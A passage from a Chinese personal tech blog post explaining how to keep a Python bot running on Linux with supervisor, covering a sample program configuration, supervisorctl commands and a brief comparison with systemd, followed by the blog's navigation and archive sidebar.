<p>[include]<br>files &#x3D; &#x2F;etc&#x2F;supervisor&#x2F;*.conf</p>
<p>然后创建如下“单元”：</p>
<p>[program:expressbot]<br>directory &#x3D; &#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;main.py<br>command &#x3D; &#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;main.py<br>autostart &#x3D; true ; 在 supervisord 启动的时候也自动启动<br>startsecs &#x3D; 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了<br>autorestart &#x3D; true ; 程序异常退出后自动重启<br>startretries &#x3D; 3 ; 启动失败自动重试次数，默认是 3<br>user &#x3D; root ; 用哪个用户启动<br>redirect_stderr &#x3D; true ; 把 stderr 重定向到 stdout，默认 false<br>stdout_logfile_maxbytes &#x3D; 20MB ; stdout 日志文件大小，默认 50MB<br>stdout_logfile_backups &#x3D; 20 ; stdout 日志文件备份数<br>stdout_logfile &#x3D; &#x2F;var&#x2F;log&#x2F;expressbot_stdout.log ;日志文件</p>
<p>然后运行supervisord就可以启动supervisor啦。</p>
<h3 id="控制supervisor"><a href="#控制supervisor" class="headerlink" title="控制supervisor"></a>控制supervisor</h3><p>类似systemd，supervisor也有个<code>supervictl</code>（配置文件查找顺序与supervisord一样），直接输入会进入交互模式，命令主要有：</p>
<p>status、stop、restart、reread（读取有更新新增的配置文件，不会启动新添加的程序）、update（重启配置文件修改过的程序），示例：</p>
<p><img src="/images/2017120708055254.png"></p>
<p>或者直接在bash下<code>supervisorctl restart WebTerminal</code>也是可以的。</p>
<p>注意：有的时候更新配置文件会没用，此时就要<code>supervisorctl reload</code>啦。</p>
<h2 id="supervisor优缺点"><a href="#supervisor优缺点" class="headerlink" title="supervisor优缺点"></a>supervisor优缺点</h2><p>相比systemd，supervisor的特点是精准、小而全，毕竟systemd是大管家嘛；supervisor跨平台，不受init的限制；supervisor提供一个Web页面，使用用户名密码的基本身份验证（在<code>/etc/supervisord.conf</code>中配置）。</p>
<p>最大的缺点就是，万一我手残kill了supervisord，那也就完蛋啦~可是我要是kill了init呢……没用的，你杀不掉的。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/12/07/linux-keep-running/index/" data-id="clhp7rthc004ls2qra3mg1sm6" data-title="Linux怎么让程序持续运行：简单说说几种好玩的办法" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/11/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><a class="extend next" rel="next" href="/page/13/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/azure/">azure</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/china/">china</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/china/justsay/">justsay</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/cloudflare/">cloudflare</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/">it</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/it/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/">justsay</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/website/">website</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/program/">program</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/program/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/share/">share</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/website/">website</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/website/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/what/">what</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/what/gfw/">gfw</a></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/12/12/candlestick-llm/index/">使用Python 通过K线计算技术指标，并用 LLM 预测趋势</a>
          </li>
        
          <li>
            <a href="/2024/11/03/warp-http-proxy/index/">把 Cloudflare WARP 转换为 http 代理</a>
          </li>
        
          <li>
            <a href="/2024/10/12/aca-php/index/">用 Azure Container Apps 运行PHP网站</a>
          </li>
        
          <li>
            <a href="/2024/10/06/aca-vm-scale/index/">Azure Container Apps 连接到虚拟机并配置CPU自动缩放</a>
          </li>
        
          <li>
            <a href="/2024/09/28/worker-image-metadata/index/">使用 Cloudflare Worker获取图片元数据</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 Benny小土豆<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>